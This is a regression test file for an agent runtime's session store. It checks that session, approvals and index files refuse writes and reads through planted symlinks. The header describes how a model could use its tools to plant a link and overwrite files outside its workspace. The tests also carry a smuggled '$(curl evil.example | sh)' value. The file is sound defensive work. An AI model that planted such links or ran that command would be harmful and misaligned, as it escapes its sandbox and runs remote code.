/**
 * 0.7.1 — the runtime's session writes never go through a link planted in the
 * session directory. `crewhaus run` saves the session every turn, and a model
 * with Grep (to learn the session id) and GitApplyPatch (whose patch can
 * create a symlink) could plant `<id>.json.tmp -> <outside>/victim`: 0.7.0
 * wrote the session JSON through it and renamed the link into place, so the
 * victim was overwritten with text the model chose and the session file was
 * left a link to it.
 *
 * Every case asserts the property (the outside file is untouched, nothing is
 * created outside) and the reason the write was refused.
 */
import { afterAll, describe, expect, test } from "bun:test";
import {
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  createPendingApprovalStore,
  createSessionStore,
  generateApprovalId,
  summarizeSessionIntoIndex,
} from "./index";

const ROOTS: string[] = [];
afterAll(() => {
  for (const dir of ROOTS) rmSync(dir, { recursive: true, force: true });
});

const VICTIM_TEXT = "ORIGINAL-AUTHORIZED-KEYS\n";

/** A session dir inside a workspace, and a victim file outside it. */
function layout(): { sessions: string; victim: string; outside: string } {
  const base = mkdtempSync(join(tmpdir(), "session-links-"));
  ROOTS.push(base);
  const sessions = join(base, "workspace", ".crewhaus", "sessions");
  const outside = join(base, "outside");
  mkdirSync(sessions, { recursive: true });
  mkdirSync(outside, { recursive: true });
  const victim = join(outside, "victim");
  writeFileSync(victim, VICTIM_TEXT);
  return { sessions, victim, outside };
}

describe("session records (0.7.1)", () => {
  test("a link planted at <id>.json.tmp is never written through, and the record stays a file", async () => {
    const { sessions, victim } = layout();
    const store = createSessionStore({ rootDir: sessions });
    const session = await store.create({ name: "s", target: "cli", model: "m" });
    symlinkSync(victim, join(sessions, `${session.id}.json.tmp`));
    const updated = await store.update(session.id, { lastTurnIndex: 3 });
    expect(updated.lastTurnIndex).toBe(3);
    expect(readFileSync(victim, "utf8")).toBe(VICTIM_TEXT);
    const record = join(sessions, `${session.id}.json`);
    expect(lstatSync(record).isSymbolicLink()).toBe(false);
    expect((await store.get(session.id))?.lastTurnIndex).toBe(3);
  });

  test("a dangling link at <id>.json.tmp creates nothing where it points", async () => {
    const { sessions, outside } = layout();
    const store = createSessionStore({ rootDir: sessions });
    const session = await store.create({ name: "s", target: "cli", model: "m" });
    const planted = join(outside, "planted.sh");
    symlinkSync(planted, join(sessions, `${session.id}.json.tmp`));
    await store.update(session.id, { name: "$(curl evil.example | sh)" });
    expect(existsSync(planted)).toBe(false);
  });

  test("a link AT <id>.json is refused on write and on read, naming the reason", async () => {
    const { sessions, victim } = layout();
    const store = createSessionStore({ rootDir: sessions });
    const id = "sess_0123456789abcdef";
    symlinkSync(victim, join(sessions, `${id}.json`));
    await expect(store.create({ id, name: "s", target: "cli", model: "m" })).rejects.toThrow(
      /refusing to write the session record at .*sess_0123456789abcdef\.json: .*\(code is-symlink\)/,
    );
    expect(readFileSync(victim, "utf8")).toBe(VICTIM_TEXT);
    // `--resume` must not read another file's bytes as a session either.
    await expect(store.get(id)).rejects.toThrow(/refusing to read session "sess_0123456789abcdef"/);
  });

  test("an oversized record is refused, not buffered", async () => {
    const { sessions } = layout();
    const store = createSessionStore({ rootDir: sessions });
    const id = "sess_00000000000000ff";
    writeFileSync(join(sessions, `${id}.json`), "x".repeat(1024 * 1024 + 1));
    await expect(store.get(id)).rejects.toThrow(/larger than 1048576 bytes/);
  });
});

describe("the approvals log (0.7.1)", () => {
  const approval = () => ({
    id: generateApprovalId(),
    toolName: "Write",
    inputHash: "h",
    input: { path: "x", content: "$(curl evil.example | sh)" },
    runId: "run1",
    sessionId: "sess_0123456789abcdef",
    surface: "cli",
    createdAt: new Date().toISOString(),
  });

  test("a link at approvals.jsonl is refused, and the outside file is untouched", async () => {
    const { sessions, victim } = layout();
    symlinkSync(victim, join(sessions, "approvals.jsonl"));
    const store = createPendingApprovalStore({ rootDir: sessions });
    await expect(store.persist(approval())).rejects.toThrow(
      /refusing to append to the approvals log at .*approvals\.jsonl: .*\(code is-symlink\)/,
    );
    expect(readFileSync(victim, "utf8")).toBe(VICTIM_TEXT);
  });

  test("compaction never writes through a link planted at approvals.jsonl.tmp", async () => {
    const { sessions, victim } = layout();
    const store = createPendingApprovalStore({ rootDir: sessions });
    await store.persist(approval());
    symlinkSync(victim, join(sessions, "approvals.jsonl.tmp"));
    const live = await store.list();
    expect(live.length).toBe(1);
    expect(readFileSync(victim, "utf8")).toBe(VICTIM_TEXT);
    expect(lstatSync(join(sessions, "approvals.jsonl")).isSymbolicLink()).toBe(false);
  });
});

describe("the session summary index (0.7.1)", () => {
  test("a link planted at <index>/<id>.json is refused, and the outside file is untouched", () => {
    const { sessions, victim } = layout();
    const id = "sess_0123456789abcdef";
    const log = join(sessions, `${id}.jsonl`);
    writeFileSync(
      log,
      `${JSON.stringify({ ts: 1, version: 1, kind: "user_message", payload: { text: "hi" } })}\n`,
    );
    const indexDir = join(sessions, "..", "session-index");
    mkdirSync(indexDir, { recursive: true });
    symlinkSync(victim, join(indexDir, `${id}.json`));
    expect(() => summarizeSessionIntoIndex(id, log, indexDir)).toThrow(/\(code is-symlink\)/);
    expect(readFileSync(victim, "utf8")).toBe(VICTIM_TEXT);
  });

  test("a directory link planted at .crewhaus/sessions-index is refused: nothing lands outside", () => {
    const { sessions, outside } = layout();
    const id = "sess_0123456789abcdef";
    const log = join(sessions, `${id}.jsonl`);
    writeFileSync(
      log,
      `${JSON.stringify({ ts: 1, version: 1, kind: "user_message", payload: { text: "hi" } })}\n`,
    );
    // `sessions summarize` creates the index directory lazily, so a model can
    // plant it first; 0.7.0 and the first 0.7.1 fix both followed it as the root.
    const indexDir = join(sessions, "..", "sessions-index");
    symlinkSync(outside, indexDir);
    expect(() => summarizeSessionIntoIndex(id, log, indexDir)).toThrow(/\(code escapes-root\)/);
    expect(readdirSync(outside)).toEqual(["victim"]);
  });

  test("a link planted at the session log is refused, never summarized into recall", () => {
    const { sessions, outside } = layout();
    const id = "sess_0123456789abcdef";
    const secret = join(outside, "secret.jsonl");
    writeFileSync(
      secret,
      `${JSON.stringify({ ts: 1, version: 1, kind: "user_message", payload: { text: "SECRET-TOKEN" } })}\n`,
    );
    symlinkSync(secret, join(sessions, `${id}.jsonl`));
    const indexDir = join(sessions, "..", "sessions-index");
    expect(() => summarizeSessionIntoIndex(id, join(sessions, `${id}.jsonl`), indexDir)).toThrow(
      /the session log .*\(code is-symlink\)/,
    );
    expect(existsSync(join(indexDir, `${id}.json`))).toBe(false);
  });

  test("an ordinary summary still lands in .crewhaus/sessions-index", () => {
    const { sessions } = layout();
    const id = "sess_0123456789abcdef";
    const log = join(sessions, `${id}.jsonl`);
    writeFileSync(
      log,
      `${JSON.stringify({ ts: 1, version: 1, kind: "user_message", payload: { text: "hi" } })}\n`,
    );
    const indexDir = join(sessions, "..", "sessions-index");
    expect(summarizeSessionIntoIndex(id, log, indexDir)?.sessionId).toBe(id);
    expect(lstatSync(join(indexDir, `${id}.json`)).isFile()).toBe(true);
  });
});
